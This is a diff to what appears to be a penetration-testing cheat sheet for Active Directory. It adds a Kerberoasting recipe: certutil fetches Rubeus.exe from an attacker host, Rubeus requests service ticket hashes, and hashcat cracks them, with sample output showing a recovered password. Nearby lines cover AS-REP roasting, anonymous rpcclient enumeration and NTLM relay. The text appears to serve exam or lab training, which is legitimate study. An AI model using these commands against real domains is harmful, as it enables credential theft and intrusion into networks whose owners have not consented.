@@ -55,6 +55,28 @@ impacket-GetNPUsers <DOMAIN>/<USER> -request -no-pass -dc-ip <DC_IP> -outputfile
 hashcat -m 18200 asrep.hashes <WORDLIST>
 ```
 
+### Rubeus Kerberoast From Victim Shell
+
+#Shell #Kerberos #Windows #ActiveDirectory #InitialAccess
+Request Kerberoastable TGS hashes from a domain-joined victim shell, then crack them offline. This is useful when you have code execution on a domain machine but do not yet have reusable domain credentials.
+
+```powershell
+# Target: download Rubeus.
+certutil -urlcache -split -f http://<LHOST>/Rubeus.exe Rubeus.exe
+
+# Target: request Kerberoast hashes in hashcat format.
+.\Rubeus.exe kerberoast /format:hashcat /nowrap
+
+# Attacker: save the captured TGS hash.
+echo '$krb5tgs$MSSQLSvc/DC.access.offsec:670A' > svc_mssql
+
+# Attacker: crack the TGS hash.
+hashcat -m 13100 svc_mssql <WORDLIST>
+# Example output:
+# ....09a4:trustno1
+# svc_mssql : trustno1
+```
+
 ### Kerbrute Password Attacks
 
 #Username #Password #Kerberos #ActiveDirectory #InitialAccess
@@ -120,6 +142,8 @@ rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
 ```
 
 ### Responder / NTLM Relay
+
+Use this path when you can capture or relay Net-NTLM authentication from a victim.
 
 ### Responder Net-NTLMv2 Capture
 
